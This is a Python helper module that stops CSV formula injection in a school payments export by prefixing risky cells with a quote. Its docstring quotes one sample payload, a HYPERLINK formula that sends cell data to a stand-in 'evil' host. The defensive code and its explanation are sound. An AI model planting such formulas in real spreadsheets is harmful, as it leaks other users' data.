# Code for util functions and classes used commonly


# Characters Excel, LibreOffice and Google Sheets treat as the start of a
# formula when they appear FIRST in a cell. Tab and CR are included because
# leading whitespace is stripped by the parsers before the check.
_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value) -> str:
    """Neutralise CSV formula injection (CWE-1236) for one cell.

    A cell beginning with `=`, `+`, `-` or `@` is evaluated as a formula on
    open. Exports here carry student names, parent names and payment concepts —
    all free text, and student creation is available to NON-ADMIN teachers — so
    a name like

        =HYPERLINK("http://evil/"&A1,"Ver")

    is stored by one user and executes on a different, more privileged user's
    workstation when they open pagos.csv. `csv.writer` quotes for CSV syntax; it
    does not and cannot address this, because the payload is valid CSV.

    Prefixing with a single quote is the conventional fix: spreadsheet apps read
    it as "treat the rest as literal text" and hide it, while plain CSV readers
    see one extra character.

    Numbers and dates are passed through untouched — a negative amount is a
    legitimate leading `-` and must not gain a quote, so only `str` values are
    inspected.
    """
    if value is None:
        return ""
    if not isinstance(value, str):
        return value
    return "'" + value if value.startswith(_CSV_FORMULA_PREFIXES) else value


def csv_safe_row(values) -> list:
    """Apply :func:`csv_safe` across an iterable — one call per `writerow`."""
    return [csv_safe(v) for v in values]
